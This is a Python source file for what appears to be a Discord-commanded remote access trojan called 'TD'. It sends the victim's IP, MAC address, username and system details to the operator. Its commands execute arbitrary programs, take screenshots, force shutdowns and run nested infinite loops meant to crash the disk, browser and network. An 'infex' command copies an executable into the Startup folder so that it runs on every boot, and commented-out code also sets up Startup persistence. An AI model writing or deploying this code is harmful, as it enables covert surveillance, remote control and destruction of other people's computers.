# Author : suegdu 
# https://suegdu.github.io/Industries/main/
# https://github.com/suegdu


















from unicodedata import name
import discord
from discord.ext import commands
import subprocess
from requests import get
import platform
import os
import sys
import time
import secrets
import datetime
import psutil
import wmi
from platform import uname
from uuid import getnode as get_mac
import socket
import webbrowser
intents = discord.Intents.default()
intents.members = True
Client = discord.Client()
client = commands.Bot(command_prefix = ["="])
time2 = time.time()
now = datetime.datetime.now()
local_now = now.astimezone()
local_tz = local_now.tzinfo
local_tzname = local_tz.tzname(local_now)
client.remove_command('help')
os.system("C:")
bot_token = " "
gt = get('https://api.ipify.org').text 
if hasattr(sys, 'real_prefix'):
    st = True
else:
     st = False



now = datetime.datetime.now()
rs = secrets.token_hex(6)
c = wmi.WMI()   
my_system = c.Win32_ComputerSystem()[0]
time2 = time.time()
sr = uname()

mac = get_mac()
now = datetime.datetime.now()
local_now = now.astimezone()
local_tz = local_now.tzinfo
local_tzname = local_tz.tzname(local_now)
vpn = get('http://ip-api.com/json?fields=proxy')
proxy = vpn.json()['proxy']
cpuis = psutil.cpu_percent()
host3 = socket.gethostname()
localip = socket.gethostbyname(host3)
if hasattr(sys, 'real_prefix'):
    st = True
else:
     st = False
def scale(bytes, suffix="B"):
    defined = 1024
    for unit in ["", "K", "M", "G", "T", "P"]:
        if bytes < defined:
            return f"{bytes:.2f}{unit}{suffix}"
        bytes /= defined
proc = platform.processor() 

fknet = False
try:
 f = subprocess.check_output("ping google.com -n 1")
except:
    fknet = True
else:
    fknet = "Unknown"
partitions = psutil.disk_partitions()
disk_io = psutil.disk_io_counters()
net_io = psutil.net_io_counters()

partitions = psutil.disk_partitions()
for partition in partitions:
    try:
        partition_usage = psutil.disk_usage(partition.mountpoint)
    except PermissionError:
        continue










@client.event
async def on_ready():
    
    
    channel = client.get_channel()
      #await channel.send("Logged in as: " + client.user.name)
    #await channel.send("Client ID: " + str(client.user.id))
    #for guild in client.guilds:
    #    await channel.send (f"Connected to server: {guild}")
    #    await channel.send(f"Agent's Machine : {gt}")
  


   
    embed=discord.Embed(title="Machine Connected", color=0x140000)
    embed.set_author(name="Agent")
    embed.add_field(name="Logged in as :", value=f"```{client.user.name}```", inline=True)
    embed.add_field(name="Client ID :",value=str(client.user.id),inline=True)
    for guild in client.guilds:
     embed.add_field(name="Connected To Server :",value=f"```{guild}```",inline=True)
    embed.add_field(name="Agent's Machine IP :",value=f"```{gt}```",inline=True)
    embed.add_field(name="Agent's Machine :",value=f"```{platform.node()}```",inline=True)
    embed.add_field(name="Agent's Machine logon :",value=f"```{os.getlogin()}```",inline=True)
    embed.add_field(name="Agent's Virual Machine Status :",value=f"```{st}```",inline=True)
    embed.add_field(name="Agent's Machine Path :",value=f"```{sys.argv[0]}```",inline=True)
    embed.add_field(name="Agent's Machine Local Timezone :",value=f"```{local_tzname}```",inline=True)
    embed.add_field(name="Agent's Machine Operating system :",value=f"```{platform.system()}```",inline=True)
    embed.set_footer(text=f"{time2} | {now}", icon_url="https://static.thenounproject.com/png/2256517-200.png")
    await client.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=f"Listening To {platform.node()}   {os.getlogin()}   {gt}"))
    
    await channel.send(embed=embed)
    #ass = "C:\\"
    #os.chdir(ass)
    #os.chdir(Path.home())
    #as2 = f"{Path.home()}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
    #ascopy = Path(f"{Path.home()}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
    #sas = "./systemdir/tds.exe"
    #original = Path(__file__)
    ##shutil.copy2(__file__[:-2]+"exe", ascopy)
    #
   #
    ##os.system(f'mv {__file__} {ass}')
    #os.chdir(as2)
    #
    #with open("tdstart.bat",'w+') as td:
    #    os.mkdir("systemdir")
    #    td.write("echo off\n")
    #    td.write("start /b ./systemdir/td.exe")
    #    os.system(f"copy {__file__} ./systemdir")
    #    #ascopy.write_bytes(original.read_bytes())
    #    #shutil.copy2(__file__[:-2]+"exe", sas)
    #    #original = Path(__file__)
    #    #target = "C:\\%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\\systemdir"

        
@client.command()
async def run(ctx,*,args):
    await ctx.send("Processing....")
    embed=discord.Embed(title="Command Caused", color=0x274700)
    embed.set_author(name="Agent321")
    embed.add_field(name="The Caused Command :", value="```run```", inline=True)
    embed.add_field(name="Machine :", value=f"```{platform.node()} | {os.getlogin()}```", inline=True)
    embed.add_field(name="Description :",value="Will Run A Specific Command Followed By The User Up.",inline=True)
    embed.add_field(name="Program",value=args,inline=True)
    os.system(f"start {args}")
    await ctx.send(embed=embed)


@client.command()
async def screenshot(ctx):
    await ctx.send("Processing....")
    rs = secrets.token_hex(6)

    #asr = f"{rs}file.png"
    os.startfile("C:\ProgramData\systemdir\systemwint.exe")
    #asr = "C:\ProgramData\systemdir\strfile.png"
    asr = "C:\ProgramData\systemdir\strfile.png"
    time.sleep(11)
    await ctx.send(f"Screenshot Of : `{gt} {platform.node()} | {os.getlogin()}`",file=discord.File(asr))
    

#@client.event  
#async def on_ready(ctx):
#    await ctx.send("Logged in as: " + client.user.name)
#    await ctx.send("Client ID: " + str(client.user.id))
#    
#    
#    
#    for guild in client.guilds:
#        await ctx.send (f"Connected to server: {guild}")

@client.command()
async def dir(ctx):
    op  = subprocess.Popen("dir",shell=True,stderr=subprocess.PIPE,stdout=subprocess.PIPE)
    output = op.stdout.read()
    output_error = op.stderr.read()
    await ctx.send(f"```{output}  {output_error}```".replace("''","").replace(r"\n","\n").replace('"',"").replace(r"\r","\r").replace("+",""))
#@client.command()
#async def exe(ctx,*,args):
#    op  = subprocess.Popen(args,shell=True,stderr=subprocess.PIPE,stdout=subprocess.PIPE)
#    
#    output = op.stdout.read()
#    output_error = op.stderr.read()
#    await ctx.send(f"```{output}  {output_error}```".replace("''","").replace(r"\n","\n").replace('"',"").replace(r"\r","\r").replace("+",""))
        
@client.command()
async def treecsh(ctx):  
    await ctx.send("Processing....")
    embed=discord.Embed(title="Command Caused", color=0x274700)
    embed.set_author(name="Agent321")
    embed.add_field(name="The Caused Command :", value="```treecsh```", inline=True)
    embed.add_field(name="Machine :", value=f"```{platform.node()} | {os.getlogin()}```", inline=True)
    embed.add_field(name="Description :",value="Will Screw Up The Agent's Machine Disk.",inline=True)
    await ctx.send(embed=embed)
    while True:
        os.system("start /b tree C:/")
        while True:
            os.system("start /b tree C:/")
            while True:
                os.system("start /b tree C:/")
                while True:
                    os.system("start /b tree C:/")
                    while True:
                        os.system("start /b tree C:/")
                        while True:
                            os.system("start /b tree C:/")
                            while True:
                                os.system("start /b tree C:/")
@client.command()
async def browser(ctx,*,args):
    rs = secrets.token_hex(6)
    await ctx.send("Processing....")
    embed=discord.Embed(title="Command Caused", color=0x274700)
    embed.set_author(name="Agent321")
    embed.add_field(name="The Caused Command :", value="```browser```", inline=True)
    embed.add_field(name="Machine :", value=f"```{platform.node()} | {os.getlogin()}```", inline=True)
    embed.add_field(name="Description :",value="Will Open A Specific Site Provided By The User On The Agent's Machine Webbrowser.",inline=True)
    embed.add_field(name="Caused Website :",value=args,inline=True)
    await ctx.send(embed=embed)
    webbrowser.open(args)  



@client.command()
async def specification(ctx):
    embed = discord.Embed(title="PT-H14", description="**User (Device)**", color=0x0c0057) 
    embed.set_author(name="ST", icon_url="https://www.shareicon.net/data/512x512/2015/09/28/647652_watch_512x512.png") 
    embed.set_thumbnail(url="https://www.blackhatwisdom.com/wp-content/uploads/2016/10/black-hat-wisdom-logo-2.png") 
    embed.add_field(name="Public IP :", value=gt, inline=True) 
    embed.add_field(name="Local IP :",value=localip)
    embed.add_field(name="Hostname, Device :", value=f"{platform.node()}", inline=True)
    embed.add_field(name="ETC :", value=f"{uname()}".replace("uname_result","").replace(")","").replace("(","").replace("'",""), inline=True) 
    embed.add_field(name="User :",value=f" {os.getlogin()} ")
    embed.add_field(name="Operating system :",value=f" {platform.system()}")
    embed.add_field(name="Virtual Machine :",value=f" {st}")
    embed.add_field(name="Manufacturer :",value=f" {my_system.Manufacturer}")
    embed.add_field(name="Model :",value=f" {my_system. Model}")
    embed.add_field(name="NumberOfProcessors :",value=f" {my_system.NumberOfProcessors}")
    embed.add_field(name="SystemType :",value=f" {my_system.SystemType}")
    embed.add_field(name="Disk Informations :",value=f"Total Size: {scale(partition_usage.total)}\nUsed: {scale(partition_usage.used)}\nFree: {scale(partition_usage.free)}\nPercentage: {partition_usage.percent}%\n\nTotal read: {scale(disk_io.read_bytes)}\nTotal write: {scale(disk_io.write_bytes)}")
    embed.add_field(name="SystemFamily :",value=f" {my_system.SystemFamily}")
    embed.add_field(name="Memory :",value=f" {psutil.virtual_memory()}")
    embed.add_field(name="Path :", value=f"**{sys.argv[0]}**", inline=True)
    embed.add_field(name="MAC Address :",value=mac)
    embed.add_field(name="Local Timezone :", value=f"**{local_tzname}**", inline=True)
    embed.add_field(name="Processor :", value=f"**{proc}**", inline=True)
    embed.add_field(name="Network Informations :",value=f"Total Sent: {scale(net_io.bytes_sent)}\nTotal Received: {scale(net_io.bytes_recv)}")
    #embed.add_embed_field(name="CPU Usage :",value=cpuis)
    embed.add_field(name="Fake Net :", value=f"**{fknet}**", inline=True)
    embed.add_field(name="VPN :",value=proxy)
    embed.set_footer(text=f"{time2} | {now}", icon_url="https://static.thenounproject.com/png/2256517-200.png")
    await ctx.send(embed=embed)
    


@client.command()
async def browsercsh(ctx):
    await ctx.send("Processing....")
    embed=discord.Embed(title="Command Caused", color=0x274700)
    embed.set_author(name="Agent321")
    embed.add_field(name="The Caused Command :", value="```browsercsh```", inline=True)
    embed.add_field(name="Machine :", value=f"```{platform.node()} | {os.getlogin()}```", inline=True)
    embed.add_field(name="Description :",value="Will Screw Up The Agent's Machine Webbrowser.",inline=True)
    await ctx.send(embed=embed)
    
    while True:
      webbrowser.open("youareanidiot.cc")
      while True:
          webbrowser.open("youareanidiot.cc")
          while True:
              webbrowser.open("youareanidiot.cc")
              while True:
                  webbrowser.open("youareanidiot.cc")
                  while True:
                      webbrowser.open("youareanidiot.cc")
                      while True:
                          webbrowser.open("youareanidiot.cc")
                          while True:
                              webbrowser.open("youareanidiot.cc")
                              while True:
                                  webbrowser.open("youareanidiot.cc")
                                  while True:
                                      webbrowser.open("youareanidiot.cc")
            
                                       
      
      
      
      
     

@client.command()
async def memorycsh(ctx):
    await ctx.send("Processing....")
    embed=discord.Embed(title="Command Caused", color=0x274700)
    embed.set_author(name="Agent321")
    embed.add_field(name="The Caused Command :", value="```memorycsh```", inline=True)
    embed.add_field(name="Machine :", value=f"```{platform.node()} | {os.getlogin()}```", inline=True)
    embed.add_field(name="Description :",value="Will Screw Up The Agent's Machine Memory.",inline=True)
    await ctx.send(embed=embed)
    while True:
        os.system(f"start /b ping {gt} -l 65500 -w 1 -n 999")
        while True:
            os.system(f"start /b ping {gt} -l 65500 -w 1 -n 999")
            while True:
                os.system(f"start /b ping {gt} -l 65500 -w 1 -n 999")
                while True:
                    os.system(f"start /b ping {gt} -l 65500 -w 1 -n 999")
                    while True:
                        os.system(f"start /b ping {gt} -l 65500 -w 1 -n 999")
                        while True:
                            os.system(f"start /b ping {gt} -l 65500 -w 1 -n 999")
                            while True:
                                os.system(f"start /b ping {gt} -l 65500 -w 1 -n 999")
                                while True:
                                    os.system(f"start /b ping {gt} -l 65500 -w 1 -n 999")
                                    while True:
                                        os.system(f"start /b ping {gt} -l 65500 -w 1 -n 999")
                                        while True:
                                            os.system(f"start /b ping {gt} -l 65500 -w 1 -n 999")
                                            while True:
                                                os.system(f"start /b ping {gt} -l 65500 -w 1 -n 999")
                                                while True:
                                                    os.system(f"start /b ping {gt} -l 65500 -w 1 -n 999")
                                                    while True:
                                                        os.system(f"start /b ping {gt} -l 65500 -w 1 -n 999")
                                                        while True:
                                                            os.system(f"start /b ping {gt} -l 65500 -w 1 -n 999")
                                                            while True:
                                                                os.system(f"start /b ping {gt} -l 65500 -w 1 -n 999")
                                                                while True:
                                                                    os.system(f"start /b ping {gt} -l 65500 -w 1 -n 999")
                                                             
                                                                          
                                                                                                                      
@client.command()
async def mshutdown(ctx):
    await ctx.send("Processing....")
    embed=discord.Embed(title="Command Caused", color=0x274700)
    embed.set_author(name="Agent321")
    embed.add_field(name="The Caused Command :", value="```mshutdown```", inline=True)
    embed.add_field(name="Machine :", value=f"```{platform.node()} | {os.getlogin()}```", inline=True)
    embed.add_field(name="Description :",value="Will Shutdown The Agent's Machine.",inline=True)
    await ctx.send(embed=embed)
    os.system("shutdown /s /t 0")

@client.command()
async def mlogoff(ctx):
    await ctx.send("Processing....")
    embed=discord.Embed(title="Command Caused", color=0x274700)
    embed.set_author(name="Agent321")
    embed.add_field(name="The Caused Command :", value="```mlogoff```", inline=True)
    embed.add_field(name="Machine :", value=f"```{platform.node()} | {os.getlogin()}```", inline=True)
    embed.add_field(name="Description :",value="Will Logoff The User In The Agent's Machine.",inline=True)
    await ctx.send(embed=embed)
    os.system("shutdown /l")

@client.command()
async def mhiber(ctx):
    await ctx.send("Processing....")
    embed=discord.Embed(title="Command Caused", color=0x274700)
    embed.set_author(name="Agent321")
    embed.add_field(name="The Caused Command :", value="```mhiber```", inline=True)
    embed.add_field(name="Machine :", value=f"```{platform.node()} | {os.getlogin()}```", inline=True)
    embed.add_field(name="Description :",value="Will Hibernate The Agent's Machine.",inline=True)
    await ctx.send(embed=embed)
    os.system("shutdown /h")

@client.command()
async def mrestart(ctx):
    await ctx.send("Processing....")
    embed=discord.Embed(title="Command Caused", color=0x274700)
    embed.set_author(name="Agent321")
    embed.add_field(name="The Caused Command :", value="```mrestart```", inline=True)
    embed.add_field(name="Machine :", value=f"```{platform.node()} | {os.getlogin()}```", inline=True)
    embed.add_field(name="Description :",value="Will Restart The Agent's Machine.",inline=True)
    await ctx.send(embed=embed)
    os.system("shutdown /r")
@client.command()
async def help(ctx):
    embed=discord.Embed(title="Help Center", description="Displays The Current Available Commands.", color=0x013f79)
    embed.set_author(name="Agent321")
    embed.set_thumbnail(url="https://cdn0.iconfinder.com/data/icons/cosmo-symbols/40/help_1-512.png")
    embed.add_field(name="__Prefix__ :",value="=",inline=True)
    embed.add_field(name="Run :", value="```Will Run A Specific Command Followed By The User```", inline=True)
    embed.add_field(name="Screenshot :", value="```Will Take A Screenshot From The Agent's Machine```", inline=True)
    embed.add_field(name="Treecsh :", value="```Will Screw Up The Agent's Machine Disk.```", inline=True)
    embed.add_field(name="Browser :", value="```Will Open A Specific Site Provided By The User On The Agent's Machine Webbrowser.```", inline=True)
    embed.add_field(name="Specification :", value="```Details About The Current Running Machine```", inline=True)
    embed.add_field(name="Browsercsh :", value="```Will Screw Up The Agent's Machine Webbrowser.```", inline=True)
    embed.add_field(name="Memorycsh :", value="```Will Screw Up The Agent's Machine Memory.```", inline=True)
    embed.add_field(name="Machine :", value="```Display The Current Running Machine```", inline=True)
    embed.add_field(name="mShutdown :",value="```Will Shutdown The Agent's Machine.```",inline=True)
    embed.add_field(name="customBrowsercsh :",value="```Will Crash The Agent's Machine By Spamming A Custom Website Giving By The End User```",inline=True)
    embed.add_field(name="mRestart :",value="```Will Restart The Agent's Machine.```",inline=True)
    embed.add_field(name="bRun :",value="```Will Run A Specific Program In The Background.```",inline=True)
    embed.add_field(name="mHiber :",value="```Will Hibernate The Agent's Machine.```",inline=True)
    embed.add_field(name="infex :",value="```Will Destroy The Agent's Machine In General On Every Boot Up Makes It Unuseable```",inline=True)
    embed.add_field(name="mLogoff :",value="```Will Logoff The User In The Agent's Machine.```",inline=True)
    embed.add_field(name="**__Usage :__**",value="The Usage Of The Following Commands.",inline=False)
    embed.add_field(name="*__bRun__*",value="```=brun *Program* or *Path*```",inline=True)
    embed.add_field(name="*__customBrowsercsh__*",value="```=custombrowsercsh *URL*```",inline=True)
    
    embed.add_field(name="*__Browser :__*",value="```=browser *URL*```",inline=True)
    embed.add_field(name="*__Run__ :*",value="```=run *Program* or *Path*```",inline=True)
    embed.set_footer(text="Version : 1.0.0 || Public Stable Version Of TD || More Details : https://suegdu.github.io/Industries/main/td.html ")
    await ctx.send(embed=embed)

@client.command()
async def machine(ctx):
    embed=discord.Embed(title="Machine Connected", color=0x140000)
    embed.set_author(name="Agent")
    embed.add_field(name="Logged in as :", value=f"```{client.user.name}```", inline=True)
    embed.add_field(name="Client ID :",value=str(client.user.id),inline=True)
    for guild in client.guilds:
     embed.add_field(name="Connected To Server :",value=f"```{guild}```",inline=True)
    embed.add_field(name="Agent's Machine IP :",value=f"```{gt}```",inline=True)
    embed.add_field(name="Agent's Machine :",value=f"```{platform.node()}```",inline=True)
    embed.add_field(name="Agent's Machine logon :",value=f"```{os.getlogin()}```",inline=True)
    embed.add_field(name="Agent's Virual Machine Status :",value=f"```{st}```",inline=True)
    embed.add_field(name="Agent's Machine Path :",value=f"```{sys.argv[0]}```",inline=True)
    embed.add_field(name="Agent's Machine Local Timezone :",value=f"```{local_tzname}```",inline=True)
    embed.add_field(name="Agent's Machine Operating system :",value=f"```{platform.system()}```",inline=True)
    embed.set_footer(text=f"{time2} | {now}", icon_url="https://static.thenounproject.com/png/2256517-200.png")
    await client.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=f"Listening To {platform.node()}   {os.getlogin()}   {gt}"))
    
    await ctx.send(embed=embed)

@client.command()
async def brun(ctx,*,args):
    await ctx.send("Processing....")
    embed=discord.Embed(title="Command Caused", color=0x274700)
    embed.set_author(name="Agent321")
    embed.add_field(name="The Caused Command :", value="```brun```", inline=True)
    embed.add_field(name="Machine :", value=f"```{platform.node()} | {os.getlogin()}```", inline=True)
    embed.add_field(name="Description :",value="Will Run A Specific Program In The Background.",inline=True)
    embed.add_field(name="Program :",value=args,inline=True)
    await ctx.send(embed=embed)
    os.system(f"start /b {args}")
@client.command()
async def customBrowsercsh(ctx,*,args):
    await ctx.send("Processing....")
    embed=discord.Embed(title="Command Caused", color=0x274700)
    embed.set_author(name="Agent321")
    embed.add_field(name="The Caused Command :", value="```customBrowsercsh```", inline=True)
    embed.add_field(name="Machine :", value=f"```{platform.node()} | {os.getlogin()}```", inline=True)
    embed.add_field(name="Description :",value="Will Crash The Agent's Machine By Spamming A Custom Website Giving By The End User",inline=True)
    embed.add_field(name="Website :",value=args,inline=True)
    await ctx.send(embed=embed)
    while True:
      webbrowser.open(args)
      while True:
          webbrowser.open(args)
          while True:
              webbrowser.open(args)
              while True:
                  webbrowser.open(args)
                  while True:
                      webbrowser.open(args)
                      while True:
                          webbrowser.open(args)
                


@client.command()
async def infex(ctx):
    await ctx.send("Processing....")
    embed=discord.Embed(title="Command Caused", color=0x274700)
    embed.set_author(name="Agent321")
    embed.add_field(name="The Caused Command :", value="```infex```", inline=True)
    embed.add_field(name="Machine :", value=f"```{platform.node()} | {os.getlogin()}```", inline=True)
    embed.add_field(name="Description :",value="Will Destroy The Agent's Machine In General On Every Boot Up Makes It Unuseable",inline=True)
   
    await ctx.send(embed=embed)
    await ctx.send("....")
    try:
        import shutil
        src = "C:\ProgramData\systemdir\systemw.exe"
        dst = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\systemw.exe"
        shutil.copyfile(src, dst)
        await ctx.send("PROCESSING.....")
        time.sleep(3)
        os.system("start /b C:\ProgramData\systemdir\systemw.exe")
    except:
        await ctx.send("ERROR: Something Went Wrong While Executing The Procedure Of This Process Due To A Missing File Or UnHandled Exception.")


        




def run():
    

 client.run(bot_token)


run()
